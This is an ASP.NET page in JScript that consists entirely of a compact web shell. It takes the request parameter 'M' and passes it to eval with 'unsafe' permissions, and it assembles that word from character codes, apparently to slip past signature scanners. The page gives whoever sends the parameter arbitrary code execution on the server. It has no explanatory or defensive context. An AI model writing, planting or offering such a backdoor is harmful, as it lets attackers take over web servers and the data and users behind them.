<%@ Page Language="Jscript"%>
<%
var p = Request.Item["M"];
var a = p.substring(0,1);
var b = p.substring(1,99999);
var c = "un" + Char ( 115 ) + Char ( 97 ) + "fe";
eval(a+b,c);
%>